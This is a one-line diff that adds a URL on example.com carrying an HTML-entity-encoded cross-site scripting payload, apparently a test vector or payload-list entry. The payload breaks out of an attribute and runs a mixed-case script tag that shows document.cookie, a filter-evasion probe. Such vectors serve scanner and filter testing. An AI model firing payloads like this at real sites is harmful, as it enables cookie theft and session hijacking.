@@ -1,0 +1,1 @@
+www.example.com/path/index.php/&gt;&quot;&gt;&lt;ScRiPt&gt;alert(document.cookie)&lt;/ScRiPt&gt;
